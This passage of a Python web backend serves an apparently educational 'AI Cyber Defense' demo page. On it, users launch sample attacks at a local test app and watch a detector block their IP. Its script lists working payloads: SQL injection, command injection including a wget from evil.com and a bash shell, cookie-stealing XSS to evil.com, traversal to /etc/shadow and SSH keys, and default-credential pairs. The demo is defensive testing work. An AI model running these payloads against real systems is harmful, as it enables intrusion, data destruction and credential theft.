    .info-bar {
      background: #1e293b;
      border: 1px solid #334155;
      border-radius: 10px;
      padding: 14px 18px;
      margin-bottom: 24px;
      display: flex;
      align-items: center;
      gap: 12px;
      flex-wrap: wrap;
    }
    .info-bar .label { color: #94a3b8; font-size: 0.8rem; }
    .info-bar .value { color: #38bdf8; font-weight: 600; font-size: 0.9rem; font-family: monospace; }
    .dot { width: 8px; height: 8px; border-radius: 50%; background: #22c55e; animation: pulse 2s infinite; }
    @keyframes pulse { 0%,100% { opacity:1; } 50% { opacity:0.4; } }

    .grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(240px, 1fr)); gap: 16px; margin-bottom: 24px; }
    .attack-card {
      background: #1e293b;
      border: 2px solid #334155;
      border-radius: 12px;
      padding: 20px;
      cursor: pointer;
      transition: all 0.2s;
      user-select: none;
    }
    .attack-card:hover { border-color: #dc2626; transform: translateY(-2px); box-shadow: 0 8px 24px rgba(220,38,38,0.15); }
    .attack-card.selected { border-color: #dc2626; background: #1c1028; }
    .attack-card .icon { font-size: 2rem; margin-bottom: 8px; }
    .attack-card .name { font-weight: 700; font-size: 0.95rem; color: #f1f5f9; margin-bottom: 4px; }
    .attack-card .desc { font-size: 0.75rem; color: #94a3b8; line-height: 1.4; }
    .attack-card .severity {
      display: inline-block;
      margin-top: 8px;
      padding: 2px 8px;
      border-radius: 4px;
      font-size: 0.7rem;
      font-weight: 700;
    }
    .sev-CRITICAL { background: rgba(220,38,38,0.2); color: #fca5a5; border: 1px solid rgba(220,38,38,0.4); }
    .sev-HIGH { background: rgba(234,88,12,0.2); color: #fdba74; border: 1px solid rgba(234,88,12,0.4); }

    .payload-section {
      background: #1e293b;
      border: 1px solid #334155;
      border-radius: 10px;
      padding: 18px;
      margin-bottom: 16px;
    }
    .payload-section label { display: block; font-size: 0.8rem; color: #94a3b8; margin-bottom: 6px; }
    .payload-section select, .payload-section input {
      width: 100%;
      background: #0f172a;
      border: 1px solid #475569;
      border-radius: 6px;
      color: #e2e8f0;
      padding: 9px 12px;
      font-size: 0.85rem;
      font-family: monospace;
      outline: none;
    }
    .payload-section select:focus, .payload-section input:focus { border-color: #7c3aed; }

    .launch-btn {
      width: 100%;
      padding: 14px;
      background: linear-gradient(135deg, #dc2626, #7c3aed);
      border: none;
      border-radius: 10px;
      color: #fff;
      font-size: 1rem;
      font-weight: 700;
      cursor: pointer;
      transition: opacity 0.2s;
      letter-spacing: 0.5px;
    }
    .launch-btn:hover { opacity: 0.9; }
    .launch-btn:disabled { opacity: 0.5; cursor: not-allowed; }

    .result-box {
      margin-top: 20px;
      border-radius: 12px;
      overflow: hidden;
      display: none;
    }
    .result-box.visible { display: block; }
    .result-header {
      padding: 14px 18px;
      font-weight: 700;
      font-size: 0.95rem;
      display: flex;
      align-items: center;
      gap: 10px;
    }
    .result-header.detected { background: #7f1d1d; }
    .result-header.clean    { background: #14532d; }
    .result-body {
      background: #1e293b;
      border: 1px solid #334155;
      border-top: none;
      padding: 16px 18px;
    }
    .result-body table { width: 100%; border-collapse: collapse; font-size: 0.82rem; }
    .result-body td { padding: 7px 10px; border-bottom: 1px solid #334155; }
    .result-body td:first-child { color: #94a3b8; width: 140px; }
    .result-body td code { background: #0f172a; padding: 2px 6px; border-radius: 4px; font-size: 0.8rem; color: #7dd3fc; }
    .mitigation-list { margin: 6px 0 0 16px; font-size: 0.82rem; color: #94a3b8; line-height: 1.7; }

    .warning-box {
      background: rgba(234,179,8,0.1);
      border: 1px solid rgba(234,179,8,0.3);
      border-radius: 8px;
      padding: 12px 16px;
      font-size: 0.8rem;
      color: #fde68a;
      margin-bottom: 20px;
    }

    .dashboard-link {
      display: inline-flex; align-items: center; gap: 6px;
      background: rgba(124,58,237,0.2);
      border: 1px solid rgba(124,58,237,0.4);
      border-radius: 6px;
      padding: 8px 14px;
      color: #c4b5fd;
      text-decoration: none;
      font-size: 0.8rem;
      margin-top: 16px;
      transition: background 0.2s;
    }
    .dashboard-link:hover { background: rgba(124,58,237,0.35); }

    footer {
      text-align: center;
      padding: 20px;
      color: #475569;
      font-size: 0.75rem;
      border-top: 1px solid #1e293b;
      margin-top: 32px;
    }
  </style>
</head>
<body>

<div class="header">
  <div style="font-size:3rem;margin-bottom:8px;">🛡️</div>
  <h1>Autonomous AI Cyber Defense</h1>
  <p>Live Attack Demo — Real-Time Detection & IP Blocking</p>
  <span class="badge">⚠️ Educational Purpose Only — Safe & Controlled Environment</span>
</div>

<div class="container">

  <div class="info-bar">
    <div class="dot"></div>
    <div>
      <div class="label">Your IP Address</div>
      <div class="value" id="client-ip">Detecting…</div>
    </div>
    <div style="margin-left:auto;">
      <div class="label">Defense System</div>
      <div class="value" id="system-status">Checking…</div>
    </div>
  </div>

  <div class="warning-box">
    ⚠️ <strong>Demo Environment Notice:</strong>
    This page allows you to trigger real security attacks against the vulnerable test application.
    The AI Defense Agent will detect your attack and <strong>block your IP address</strong>.
    All attacks are logged and analysed. After blocking, your IP can be unblocked via the dashboard.
  </div>

  <h2 style="font-size:1rem;font-weight:700;margin-bottom:14px;color:#f1f5f9;">Select Attack Type</h2>
  <div class="grid" id="attack-grid">
    <div class="attack-card selected" data-type="SQL_INJECTION">
      <div class="icon">💉</div>
      <div class="name">SQL Injection</div>
      <div class="desc">Inject malicious SQL into login/search forms to bypass authentication or steal data.</div>
      <span class="severity sev-CRITICAL">CRITICAL</span>
    </div>
    <div class="attack-card" data-type="COMMAND_INJECTION">
      <div class="icon">⚡</div>
      <div class="name">Command Injection</div>
      <div class="desc">Execute arbitrary OS commands by injecting shell metacharacters.</div>
      <span class="severity sev-CRITICAL">CRITICAL</span>
    </div>
    <div class="attack-card" data-type="XSS">
      <div class="icon">🕷️</div>
      <div class="name">Cross-Site Scripting</div>
      <div class="desc">Inject JavaScript payloads to hijack sessions or steal cookies.</div>
      <span class="severity sev-HIGH">HIGH</span>
    </div>
    <div class="attack-card" data-type="PATH_TRAVERSAL">
      <div class="icon">📁</div>
      <div class="name">Path Traversal</div>
      <div class="desc">Access files outside the web root using ../ sequences.</div>
      <span class="severity sev-HIGH">HIGH</span>
    </div>
    <div class="attack-card" data-type="BRUTE_FORCE">
      <div class="icon">🔨</div>
      <div class="name">Brute Force</div>
      <div class="desc">Repeatedly attempt login to guess credentials.</div>
      <span class="severity sev-HIGH">HIGH</span>
    </div>
  </div>

  <div class="payload-section">
    <label>Attack Payload</label>
    <select id="payload-select"></select>
  </div>

  <button class="launch-btn" id="launch-btn" onclick="launchAttack()">
    🚀 Launch Attack — Test the Defense System
  </button>

  <div class="result-box" id="result-box">
    <div class="result-header" id="result-header"></div>
    <div class="result-body" id="result-body"></div>
  </div>

  <div style="text-align:center;margin-top:20px;">
    <a href="http://localhost:3000" target="_blank" class="dashboard-link">
      📊 Open Defense Dashboard ↗
    </a>
    <a href="http://localhost:3000/attacks" target="_blank" class="dashboard-link" style="margin-left:8px;">
      🚨 Live Attack Feed ↗
    </a>
    <a href="http://localhost:8000/docs" target="_blank" class="dashboard-link" style="margin-left:8px;">
      📖 API Docs ↗
    </a>
  </div>
</div>

<footer>
  Autonomous AI Cyber Defense Agent — For educational and demonstration purposes only.
  All attacks are simulated in a controlled environment.
</footer>

<script>
const PAYLOADS = {
  SQL_INJECTION: [
    "' OR '1'='1--",
    "admin' UNION SELECT username,password FROM users--",
    "1'; DROP TABLE users--",
    "1 AND SLEEP(5)--",
    "' OR BENCHMARK(5000000,MD5(1))--"
  ],
  COMMAND_INJECTION: [
    "localhost;cat /etc/passwd",
    "127.0.0.1|id",
    "x;/bin/bash -i",
    "x;wget http://evil.com/shell.sh",
    "x$(cat /etc/passwd)"
  ],
  XSS: [
    "<script>alert(document.cookie)</script>",
    "<img src=x onerror=alert(1)>",
    "javascript:alert(document.cookie)",
    "<svg onload=alert(1)>",
    "<body onload=document.location='http://evil.com?c='+document.cookie>"
  ],
  PATH_TRAVERSAL: [
    "../../../../etc/passwd",
    "../../../../.ssh/id_rsa",
    "%2e%2e%2f%2e%2e%2fetc%2fshadow",
    "../../../../etc/hosts",
    "../../../../proc/self/environ"
  ],
  BRUTE_FORCE: [
    "admin:password",
    "admin:123456",
    "root:root",
    "user:pass"
  ]
};

let selectedType = 'SQL_INJECTION';

// Detect client IP from the server
fetch('/api/demo/whoami').then(r => r.json()).then(d => {
  document.getElementById('client-ip').textContent = d.ip || 'Unknown';
}).catch(() => {
  document.getElementById('client-ip').textContent = 'Unable to detect';
});

// Check system status
fetch('/health').then(r => r.json()).then(d => {
  const ok = d.status === 'healthy';
  document.getElementById('system-status').textContent = ok ? '✅ Online & Active' : '⚠️ Degraded';
  document.getElementById('system-status').style.color = ok ? '#4ade80' : '#facc15';
}).catch(() => {
  document.getElementById('system-status').textContent = '❌ Offline';
  document.getElementById('system-status').style.color = '#f87171';
});

// Card selection
document.querySelectorAll('.attack-card').forEach(card => {
  card.addEventListener('click', () => {
    document.querySelectorAll('.attack-card').forEach(c => c.classList.remove('selected'));
    card.classList.add('selected');
    selectedType = card.dataset.type;
    updatePayloads();
  });
});

function updatePayloads() {
  const sel = document.getElementById('payload-select');
  sel.innerHTML = '';
  (PAYLOADS[selectedType] || []).forEach(p => {
    const opt = document.createElement('option');
    opt.value = p;
    opt.textContent = p;
    sel.appendChild(opt);
  });
}

updatePayloads();

async function launchAttack() {
  const btn = document.getElementById('launch-btn');
  const payload = document.getElementById('payload-select').value;
  btn.disabled = true;
  btn.textContent = '⏳ Launching attack…';

  const resultBox = document.getElementById('result-box');
  const resultHeader = document.getElementById('result-header');
  const resultBody = document.getElementById('result-body');
  resultBox.classList.remove('visible');

  try {
    const resp = await fetch('/api/demo/attack', {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({attack_type: selectedType, payload})
    });
    const data = await resp.json();

    resultBox.classList.add('visible');

    if (data.detected) {
      resultHeader.className = 'result-header detected';
      resultHeader.innerHTML = `🚨 ATTACK DETECTED — Your IP <code style="background:rgba(0,0,0,0.3);padding:2px 6px;border-radius:4px;">${data.attacker_ip}</code> has been <strong>BLOCKED</strong>`;

      const det = data.detections[0] || {};
      const mit = (det.analysis?.mitigation || []);
      const mitHtml = mit.length
        ? '<ul class="mitigation-list">' + mit.map(m => `<li>${m}</li>`).join('') + '</ul>'
        : '';

      resultBody.innerHTML = `
        <table>
          <tr><td>Attack Type</td><td><strong>${det.attack_type || selectedType}</strong></td></tr>
          <tr><td>Severity</td><td><strong style="color:#f87171;">${det.severity}</strong></td></tr>
          <tr><td>Attacker IP</td><td><code>${data.attacker_ip}</code></td></tr>
          <tr><td>Payload</td><td><code>${escHtml(payload)}</code></td></tr>
          <tr><td>Status</td><td><strong style="color:#4ade80;">✅ IP BLOCKED by AI Defense Engine</strong></td></tr>
        </table>
        ${det.analysis?.explanation ? `<p style="margin-top:12px;font-size:0.82rem;color:#94a3b8;line-height:1.5;">${det.analysis.explanation}</p>` : ''}
        ${mitHtml ? `<p style="margin-top:10px;font-size:0.8rem;font-weight:600;color:#e2e8f0;">Mitigation:</p>${mitHtml}` : ''}
      `;
    } else {
      resultHeader.className = 'result-header clean';
      resultHeader.innerHTML = `✅ Attack not detected (check payload or system status)`;
      resultBody.innerHTML = `
        <table>
          <tr><td>Attack Type</td><td>${selectedType}</td></tr>
          <tr><td>Your IP</td><td><code>${data.attacker_ip}</code></td></tr>
          <tr><td>Message</td><td>${data.message}</td></tr>
        </table>
      `;
    }
  } catch (e) {
    resultBox.classList.add('visible');
    resultHeader.className = 'result-header detected';
    resultHeader.textContent = '❌ Error connecting to defense system';
    resultBody.innerHTML = `<p style="color:#f87171;">Could not reach the backend: ${e.message}</p>`;
  }

  btn.disabled = false;
  btn.textContent = '🚀 Launch Attack — Test the Defense System';
}

function escHtml(s) {
  return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
}
</script>
</body>
</html>"""


@router.get("/demo", response_class=HTMLResponse, tags=["demo"])
async def demo_page():
    """Interactive attack demo page — accessible from any device on the local network."""
    return HTMLResponse(content=_DEMO_HTML)


@router.get("/api/demo/whoami", tags=["demo"])
async def whoami(request: Request):
    """Return the caller's real IP address (used by the demo page)."""
    return {"ip": _get_client_ip(request)}


# ------------------------------------------------------------------
# WebSocket live feed
# ------------------------------------------------------------------

@router.websocket("/ws/attacks")
async def websocket_attacks(websocket: WebSocket):
    await websocket.accept()
    _ws_connections.append(websocket)
    try:
        while True:
            # Keep-alive ping every 30 s
            await asyncio.sleep(30)
            await websocket.send_json({"type": "ping"})
    except WebSocketDisconnect:
        _ws_connections.remove(websocket)
    except Exception:
        if websocket in _ws_connections:
            _ws_connections.remove(websocket)


async def broadcast_attack(attack: Dict):
    """Broadcast a new attack event to all connected WebSocket clients."""
    dead = []
    for ws in list(_ws_connections):
        try:
            await ws.send_json({"type": "new_attack", "data": attack})
        except Exception:
            dead.append(ws)
    for ws in dead:
        _ws_connections.remove(ws)
